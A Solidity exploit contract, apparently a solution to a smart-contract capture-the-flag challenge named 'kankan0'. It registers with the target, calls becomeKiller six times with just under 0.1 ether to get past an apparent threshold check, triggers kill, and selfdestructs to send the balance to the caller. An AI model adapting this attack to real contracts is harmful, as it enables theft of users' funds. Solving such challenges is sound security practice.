// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_kankan0 {
    function killer() external view returns (address);

    function timeToKill() external view returns (bool);

    function register() external payable;

    function canKill() external;

    function kill() external;

    function becomeKiller() external payable;
}

contract Exploit_kankan0 {
    IChallenge_kankan0 instance;

    constructor(IChallenge_kankan0 _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        instance.register{value: 0.01 ether}();
        instance.canKill();
        for (uint256 i = 0; i < 6; ++i) {
            instance.becomeKiller{value: 0.1 ether - 1 wei}();
        }
        instance.kill();

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
